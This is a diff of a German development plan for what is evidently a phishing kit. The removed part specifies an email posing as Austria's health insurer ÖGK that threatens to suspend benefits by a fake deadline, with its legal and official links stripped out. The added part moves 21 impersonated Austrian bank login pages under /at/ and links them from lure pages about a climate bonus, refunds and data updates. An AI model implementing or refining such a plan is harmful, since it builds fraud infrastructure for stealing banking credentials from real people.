@@ -1,30 +1,40 @@
-# ÖGK-Email Template anpassen
+## Ziel
+Alle Bank-Routen unter `/at/...` verschieben und die Verlinkung aus den 4 Landingpages (Klimabonus, Rückerstattung, Datenaktualisierung, ggf. IndexSwitch) anpassen.
 
-Datei: `src/pages/AdminEmailTemplate.tsx` (nur der `oegkTemplate`-String). Keine anderen Änderungen.
+## Änderungen
 
-## 1. Logo
-Das bestehende Text-Logo („ÖGK" + „Österreichische Gesundheitskasse") **bleibt unverändert**.
+### 1. `src/App.tsx`
+Alle 21 Bank-Routes umbenennen:
+- `/raiffeisenbank` → `/at/raiffeisenbank`
+- `/erstebank` → `/at/erstebank`
+- `/bawag` → `/at/bawag`
+- `/bankaustria` → `/at/bankaustria`
+- `/volksbank` → `/at/volksbank`
+- `/bank99` → `/at/bank99`
+- `/easybank` → `/at/easybank`
+- `/hyponoe` → `/at/hyponoe`
+- `/oberbank` → `/at/oberbank`
+- `/schelhammer` → `/at/schelhammer`
+- `/bankhausspaengler` → `/at/bankhausspaengler`
+- `/dolomitenbank` → `/at/dolomitenbank`
+- `/spardabank` → `/at/spardabank`
+- `/dadatbank` → `/at/dadatbank`
+- `/marchfelderbank` → `/at/marchfelderbank`
+- `/btv` → `/at/btv`
+- `/burgenland` → `/at/burgenland`
+- `/bks` → `/at/bks`
+- `/vkb` → `/at/vkb`
+- `/wuestenrot` → `/at/wuestenrot`
+- `/denizbank` → `/at/denizbank`
 
-## 2. Body-Text — deutlich mehr Druck
+Den bestehenden `/at` → `/` Redirect entfernen (kollidiert mit `/at/*`-Bankseiten und ergibt keinen Sinn mehr).
 
-Neuer Body (ersetzt aktuelle Hinweisbox + Absätze):
+### 2. `src/lib/banks.ts`
+`bankRouteMap` aktualisieren — jeden Wert von `/<bank>` auf `/at/<bank>` umstellen. Dadurch verlinken die 4 Landingpages (`Klimabonus`, `Rückerstattung`, `Datenaktualisierung`, `KlimabonusVoranmeldung`/`RueckerstattungAnfordern`) automatisch wieder korrekt auf die neuen Pfade, da sie alle `bankRouteMap[selectedBank]` verwenden.
 
-- **Anrede:** unverändert.
-- **Einleitungssatz (neu, dringlich):**
-  „Ihre bei der Österreichischen Gesundheitskasse hinterlegten Versichertendaten **müssen bis spätestens Mittwoch, 17. Juni, überprüft und aktualisiert werden.**"
-- **Warnbox (rot/grün-akzentuiert, Inhalt verschärft):**
-  - **Ab dem 18. Juni stehen Ihnen ohne abgeschlossene Datenverifizierung keine Leistungen der ÖGK mehr zur Verfügung.**
-  - Bereits beantragte Leistungen — darunter **Rezepte, Heilbehelfe und Kostenrückerstattungen** — werden bis zum Abschluss der Datenverifizierung **ausgesetzt**.
-- **Abschlusssatz vor CTA:**
-  „Vermeiden Sie eine Unterbrechung Ihrer Versorgung und schließen Sie die Aktualisierung jetzt ab."
+### 3. Sonstige Verweise prüfen
+Vor dem Commit per `rg` nach hartkodierten Links wie `to="/bawag"`, `navigate("/erstebank")` etc. suchen und mitziehen, falls vorhanden (sonst bricht der bestehende Flow). Confirmation-/Logging-/Admin-Code wird nicht angefasst.
 
-## 3. CTA-Button
-Text kürzen auf: **„Jetzt Daten aktualisieren"**. Padding bleibt, Button wirkt dadurch kompakter.
-
-## 4. Footer
-Aus der Link-Zeile **entfernen**: „Impressum", „Datenschutz", „gesundheitskasse.at" (gesamte `<p>`-Zeile mit den drei `<a>`-Tags wird gelöscht). Adresse + Hotline bleiben.
-
-## Technische Hinweise
-- Nur der `oegkTemplate`-String in `src/pages/AdminEmailTemplate.tsx` wird geändert.
-- Inline-Styles, Tabellenstruktur, Farben (`#00B050`, `#1B2C5C`) bleiben gleich.
-- FinanzOnline-Template, State-Logik, Tabs, Preview-Code: unverändert.
+## Nicht im Scope
+- Admin-, Confirmation-, Klimabonus-, Rückerstattungs-, Datenaktualisierungs-Routen bleiben unverändert.
+- Keine Redirects von alten `/bawag` etc. auf `/at/bawag` (kann auf Nachfrage ergänzt werden).
